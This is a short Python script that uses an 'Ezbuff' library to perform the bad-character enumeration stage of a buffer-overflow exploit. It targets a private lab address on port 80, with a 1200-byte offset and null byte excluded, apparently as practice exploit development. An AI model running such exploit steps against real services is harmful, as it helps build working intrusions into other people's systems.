#!/usr/bin/env python3


from Ezbuff.ezbuff import Ezbuff
from sys import argv


def main():
	test = Ezbuff("192.168.230.10", 80)

	test.offset = 1200

	test.add_bad_char(r'\x00')

	test.send_bad_chars()


if __name__ == '__main__':
	main()